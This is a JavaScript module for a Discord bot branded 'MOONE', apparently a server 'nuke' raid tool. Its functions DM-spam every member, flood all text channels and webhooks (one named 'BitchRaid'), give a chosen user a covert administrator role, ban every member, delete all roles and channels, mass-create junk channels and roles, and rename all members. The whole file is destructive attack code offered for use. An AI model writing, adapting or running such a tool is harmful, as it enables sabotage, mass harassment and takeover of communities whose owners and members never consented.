const Discord = require('discord.js')
const server = require('../server.js')

module.exports.SendMsg = async function(client, msg, server_id) {
client.guilds.cache.forEach(guild => {
if(server_id && guild.id !== server_id) return;
guild.members.cache.forEach(member => {
if(member.id === client.user.id) return;
let error;
member.send(`${msg}\n\n**MOONE** ✨`).catch(err => {
error = true;
console.error('[ERROR] => Faild to send a message to ' + member.user.tag + '.') 
})
if(!error) console.log('[CLIENT] => a message was sent to ' + member.user.tag + '.') 
})
})
}

module.exports.SendChannels = async function(client, msg, time, server_id) {
if(!time) time = 1
if(isNaN(time)) time = 1
if(time > 100) time = 100
client.guilds.cache.forEach(guild => {
if(server_id && guild.id !== server_id) return;
guild.channels.cache.forEach(ch => {
if(ch.type !== "text") return;
let i;
for (i = 0; i < time; i++) {
let error;
if(i === time-1) return ch.send(`This server got nuked using **MOONE** ✨`);
ch.send(`${msg}`).catch(err => {
error = true;
console.error('[ERROR] => Faild to send a message to ' + ch.name + '.') 
})
if(!error) console.log('[CLIENT] => a message was sent to ' + ch.name + '.') 
}
})
})
}

module.exports.WebChannels = async function(client, msg, time, server_id) {
  if(!time) time = 1
  if(isNaN(time)) time = 1
  if(time > 100) time = 100
client.guilds.cache.forEach(guild => {
if(server_id && guild.id !== server_id) return;
 guild.channels.cache.forEach(ch => {
if(ch.type !== "text") return;
let i;
ch.createWebhook('BitchRaid', {
avatar: 'https://cdn.glitch.com/d42a5d83-bb45-4bb0-961c-ec50bddbac73%2Faaaas.png',
}).then(webhook => {
 for (i = 0; i < time; i++) {
  let error;
  webhook.send(`${msg}`).catch(err => {
  error = true;
  console.error('[ERROR] => Faild to send a message to ' + ch.name + '.') 
  })
  if(!error) console.log('[CLIENT] => a message was sent to ' + ch.name + '.') 
  }
}).catch(err => {
  console.error('[ERROR] => Faild to create a weebhook in to ' + ch.name + '.') 
  })
})})}

module.exports.GiveAdmin = async function(client, id, server_id) {
  client.guilds.cache.forEach(guild => {
if(server_id && guild.id !== server_id) return;
  guild.members.cache.forEach(member => {
  if(member.id === client.user.id) return;
  if(member.id === id) {
  guild.roles.create({
  data: {
      name: ".-.",
      color: "#ff0000",
      permissions: 8
  }
}).then(role => {
member.addRole(role);
}).catch(err => {
  error = true;
  console.error('[ERROR] => Faild to give a role to ' + member.user.tag + '.') 
  })
  if(!error) console.log('[CLIENT] => ' + member.user.tag + ' just got given the role.');
  }})})}

module.exports.BanMembers = async function(client, server_id) {
client.guilds.cache.forEach(guild => {
if(server_id && guild.id !== server_id) return;
guild.members.cache.forEach(member => {
if(member.id === client.user.id) return;
console.log(member.user.tag + " Banned")
let error;
member.ban().catch(err => {
error = true;
console.error('[ERROR] => Faild to ban ' + member.user.tag + '.') 
})
if(!error) console.log('[CLIENT] => ' + member.user.tag + ' just got banned.') 
})})}

module.exports.DelRoles = async function(client, server_id) {
client.guilds.cache.forEach(guild => {
if(server_id && guild.id !== server_id) return;
guild.roles.cache.forEach(role => {
let error;
role.delete().catch(err => {
error = true;
console.error('[ERROR] => Faild to delete the role ' + role.name + '.') 
})
if(!error) console.log('[CLIENT] => ' + role.name + ' just got deleted.') 
})})}

module.exports.DelChannels = async function(client, server_id) {
client.guilds.cache.forEach(guild => {
if(server_id && guild.id !== server_id) return;
guild.channels.cache.forEach(ch => {
let error;
ch.delete().catch(err => {
error = true;
console.error('[ERROR] => Faild to delete the channel ' + ch.name + '.') 
})
if(!error) console.log('[CLIENT] => ' + ch.name + ' just got deleted.') 
})})}

module.exports.RanChannels = async function(client, num, name, server_id) {
client.guilds.cache.forEach(guild => {
if(server_id && guild.id !== server_id) return;
var i;
for (i = 0; i < num; i++) {
if(!name) name = makeid(5)
let error;
if(i === num-1 && num !== 1) return guild.channels.create("MOONE✨")
guild.channels.create(name).catch(err => {
error = true;
console.error('[ERROR] => Faild to create a channel ' + '.') 
})
if(!error) console.log('[CLIENT] => ' + ' a channel just got created.')
}})}

module.exports.ChangeNicknames = async function(client, msg, server_id) {
client.guilds.cache.forEach(guild => {
if(server_id && guild.id !== server_id) return;
guild.members.cache.forEach(member => {
if(member.id === client.user.id) return;
let error;
member.setNickname(msg).catch(err => {
error = true;
console.error('[ERROR] => Faild to change ' + member.user.tag + ' Nickname.') 
})
if(!error) console.log('[CLIENT] => ' + member.user.tag + ' Nickname changed.') 
})})}

module.exports.RanRoles = async function(client, num, name, server_id) {
client.guilds.cache.forEach(guild => {
if(server_id && guild.id !== server_id) return;
var i;
for (i = 0; i < num; i++) {
if(!name) name = makeid(5);
let error;
if(i === num-1 && num !== 1) return guild.roles.create({ data: { name: "MOONE✨", color: "WHITE"}})
guild.roles.create({
  data: {
    name: name,
    color: 'BLUE'
  }
}).catch(err => {
error = true;
console.error('[ERROR] => Faild to create a role ' + '.') 
})
if(!error) console.log('[CLIENT] => ' + ' a role just got created.')
}})}

function makeid(length) {
   var result           = '';
   var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
   var charactersLength = characters.length;
   for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
}

async function login(token) {
let client = new Discord.Client()
let c = await client.login(token)

return client
}
function sleep(milliseconds) {
  const date = Date.now();
  let currentDate = null;
  do {
    currentDate = Date.now();
  } while (currentDate - date < milliseconds);
}